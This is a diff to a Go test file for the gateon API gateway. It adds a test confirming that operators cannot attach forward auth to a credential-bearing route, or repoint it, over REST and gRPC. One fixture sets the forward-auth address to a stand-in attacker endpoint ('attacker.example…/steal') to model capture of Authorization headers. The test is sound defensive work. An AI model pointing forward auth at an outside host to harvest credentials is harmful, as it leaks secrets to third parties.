@@ -23,6 +23,7 @@ import (
 	"github.com/gsoultan/gateon/internal/auth"
 	"github.com/gsoultan/gateon/internal/authz/routebind"
 	"github.com/gsoultan/gateon/internal/config"
+	dmw "github.com/gsoultan/gateon/internal/domain/middleware"
 	"github.com/gsoultan/gateon/internal/domain/route"
 	"github.com/gsoultan/gateon/internal/domain/service"
 	"github.com/gsoultan/gateon/internal/logger"
@@ -55,6 +56,7 @@ func newRouteAPI(t *testing.T, role string) *routeAPI {
 	deps := &handlers.Deps{
 		RouteService:   route.NewService(routes, mwNoopInvalidator{}, logger.Default(), guard),
 		ServiceService: service.NewService(services, routes, mwNoopInvalidator{}, logger.Default(), guard),
+		MwService:      dmw.NewService(reg, routes, mwNoopInvalidator{}, nil, nil, logger.Default(), guard),
 	}
 
 	mux := http.NewServeMux()
@@ -101,6 +103,8 @@ func seedBindingFixtures(t *testing.T, reg *config.MiddlewareRegistry, services 
 			Config: map[string]string{"query_api_key": "adminkey"}},
 		{Id: "plain", Name: "plain", Type: "headers",
 			Config: map[string]string{"set_request_X-Trace-Id": "abc"}},
+		{Id: "fwd-auth", Name: "fwd-auth", Type: "forwardauth",
+			Config: map[string]string{"address": "http://auth.internal/verify"}},
 	}
 	for _, m := range mws {
 		if err := reg.Update(ctx, m); err != nil {
@@ -134,6 +138,25 @@ func (a *routeAPI) putRouteREST(t *testing.T, rt *gateonv1.Route) int {
 		t.Fatal(err)
 	}
 	req, err := http.NewRequestWithContext(context.Background(), http.MethodPut, a.url+"/v1/routes", strings.NewReader(string(body)))
+	if err != nil {
+		t.Fatal(err)
+	}
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := a.http.Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer func() { _ = resp.Body.Close() }()
+	return resp.StatusCode
+}
+
+func (a *routeAPI) putMiddlewareREST(t *testing.T, mw *gateonv1.Middleware) int {
+	t.Helper()
+	body, err := protojson.Marshal(mw)
+	if err != nil {
+		t.Fatal(err)
+	}
+	req, err := http.NewRequestWithContext(context.Background(), http.MethodPut, a.url+"/v1/middlewares", strings.NewReader(string(body)))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -320,4 +343,67 @@ func TestViewerCannotWriteRoutes(t *testing.T) {
 	if a.hasRoute(rt.Id) {
 		t.Fatal("viewer wrote a route")
 	}
+}
+
+// TestOperatorCannotForwardCredentialRoute is the ADR 0038 bypass ADR 0072
+// closes, end to end on both transports. The admin's route keeps its service, so
+// nothing is repointed, but forward auth copies every request header -- the
+// Authorization the credential middleware just set among them -- to its own
+// address. Adding it to the route, or moving the address of one already there,
+// is the same capture by another door; both are refused and nothing is stored.
+func TestOperatorCannotForwardCredentialRoute(t *testing.T) {
+	setup := func(t *testing.T, role string, mws ...string) *routeAPI {
+		a := newRouteAPI(t, role)
+		if err := a.routes.Update(context.Background(), credentialRoute("admin-cred", "svc-legit", mws...)); err != nil {
+			t.Fatal(err)
+		}
+		return a
+	}
+	withFwd := credentialRoute("admin-cred", "svc-legit", "cred-hdr", "fwd-auth")
+	moved := &gateonv1.Middleware{Id: "fwd-auth", Name: "fwd-auth", Type: "forwardauth",
+		Config: map[string]string{"address": "http://attacker.example:9090/steal"}}
+	stillLegit := func(t *testing.T, a *routeAPI) {
+		t.Helper()
+		if got, _ := a.routes.Get(context.Background(), "admin-cred"); len(got.GetMiddlewares()) != 1 {
+			t.Fatalf("route middlewares changed despite the refusal: %v", got.GetMiddlewares())
+		}
+	}
+
+	t.Run("REST/route", func(t *testing.T) {
+		a := setup(t, auth.RoleOperator, "cred-hdr")
+		if code := a.putRouteREST(t, withFwd); code != http.StatusForbidden {
+			t.Fatalf("operator adding forward auth to a credential route: got %d, want 403", code)
+		}
+		stillLegit(t, a)
+	})
+	t.Run("gRPC/route", func(t *testing.T) {
+		a := setup(t, auth.RoleOperator, "cred-hdr")
+		_, err := a.grpc.UpdateRoute(context.Background(), &gateonv1.UpdateRouteRequest{Route: withFwd})
+		if status.Code(err) != codes.PermissionDenied {
+			t.Fatalf("operator adding forward auth over gRPC: got %v, want PermissionDenied", err)
+		}
+		stillLegit(t, a)
+	})
+	t.Run("REST/address", func(t *testing.T) {
+		a := setup(t, auth.RoleOperator, "cred-hdr", "fwd-auth")
+		if code := a.putMiddlewareREST(t, moved); code != http.StatusForbidden {
+			t.Fatalf("operator moving forward auth on a credential route: got %d, want 403", code)
+		}
+	})
+	t.Run("gRPC/address", func(t *testing.T) {
+		a := setup(t, auth.RoleOperator, "cred-hdr", "fwd-auth")
+		_, err := a.grpc.UpdateMiddleware(context.Background(), &gateonv1.UpdateMiddlewareRequest{Middleware: moved})
+		if status.Code(err) != codes.PermissionDenied {
+			t.Fatalf("operator moving forward auth over gRPC: got %v, want PermissionDenied", err)
+		}
+	})
+	t.Run("admin", func(t *testing.T) {
+		a := setup(t, auth.RoleAdmin, "cred-hdr")
+		if code := a.putRouteREST(t, withFwd); code != http.StatusOK {
+			t.Fatalf("admin adding forward auth to a credential route: got %d, want 200", code)
+		}
+		if code := a.putMiddlewareREST(t, moved); code != http.StatusOK {
+			t.Fatalf("admin moving forward auth on a credential route: got %d, want 200", code)
+		}
+	})
 }
